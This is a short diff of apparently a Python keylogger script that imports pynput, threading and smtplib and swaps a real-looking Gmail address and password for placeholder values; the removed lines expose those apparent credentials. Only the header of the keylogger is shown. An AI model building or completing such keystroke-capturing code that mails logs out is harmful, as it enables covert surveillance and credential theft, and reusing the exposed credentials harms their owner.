@@ -2,8 +2,8 @@ import pynput.keyboard
 import threading
 import smtplib
 
-email = "jhnsnw32@gmail.com"
-password = "Abc123Abc12"
+email = "Test@gmail.com"
+password = "Test123"
 
 content = ""
 def process_key_strike(key):
